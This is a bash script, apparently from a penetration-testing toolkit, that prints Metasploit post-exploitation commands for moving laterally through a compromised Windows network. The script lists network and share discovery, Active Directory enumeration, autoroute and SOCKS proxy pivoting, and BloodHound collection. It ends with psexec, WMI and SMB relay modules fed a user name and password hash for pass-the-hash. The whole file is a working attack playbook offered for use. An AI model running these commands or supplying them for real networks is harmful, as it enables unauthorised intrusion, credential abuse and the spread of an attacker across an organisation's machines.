#!/usr/bin/env bash
# ==============================================================================
# LATERAL MOVEMENT GRAPH — Visualize network paths
# Usage: bash lateral_graph.sh <SESSION_ID>
# ==============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../../lib/common.sh" 2>/dev/null || true
source "$SCRIPT_DIR/../../../lib/env.sh" 2>/dev/null || true
SESSION="${1:-}"
IN_MSF=false; [[ "${MSF_CONSOLE:-}" == "1" ]] || [[ -n "${MSFCONSOLE_BIN:-}" ]] && IN_MSF=true
run_msf() { local m="$1"; shift; local c="use $m"; for a in "$@"; do c="$c; set $a"; done; c="$c; run"; echo "$c"; }
echo ""; echo "=== LATERAL MOVEMENT GRAPH ==="; [[ -n "$SESSION" ]] && echo "Session: $SESSION"; echo ""
echo -e "--- ${BLUE}Network Discovery${NC} ---"
$IN_MSF && run_msf "post/windows/gather/arp_scanner" "SESSION ${SESSION:-1}" "RHOSTS <subnet>" || echo "run post/windows/gather/arp_scanner"
$IN_MSF && run_msf "post/windows/gather/enum_network" "SESSION ${SESSION:-1}" || echo "run post/windows/gather/enum_network"
$IN_MSF && run_msf "post/windows/gather/enum_shares" "SESSION ${SESSION:-1}" || echo "run post/windows/gather/enum_shares"
$IN_MSF && run_msf "post/multi/gather/ping_sweep" "SESSION ${SESSION:-1}" "RHOSTS <subnet>" || echo "run post/multi/gather/ping_sweep"
echo ""
echo -e "--- ${BLUE}AD Reconnaissance${NC} ---"
for ad in enum_ad_computers enum_domains enum_domain_users enum_domain_groups; do
    $IN_MSF && run_msf "post/windows/gather/$ad" "SESSION ${SESSION:-1}"
done
echo ""
echo -e "--- ${MAGENTA}Build Graph (Post-Exploitation)${NC} ---"
echo "# In meterpreter:"
echo "  run post/multi/manage/autoroute SUBNET=<target_subnet>"
echo "  run post/multi/manage/autoroute -p  # print routes"
echo "  use auxiliary/server/socks_proxy; set SRVPORT 1080; run"
echo "  # then: proxychains nmap -sT <internal_ip>"
echo ""
echo "# BloodHound data collection:"
echo "  run post/windows/gather/bloodhound"
echo "# Or use SharpHound.exe on target"
echo ""
echo "# Lateral movement options:"
for lat in psexec psexec_psh wmi_exec smb_relay; do
    echo "  use exploit/windows/smb/$lat; set RHOSTS <IP>; set SMBUser <USER>; set SMBPass <HASH>"
done
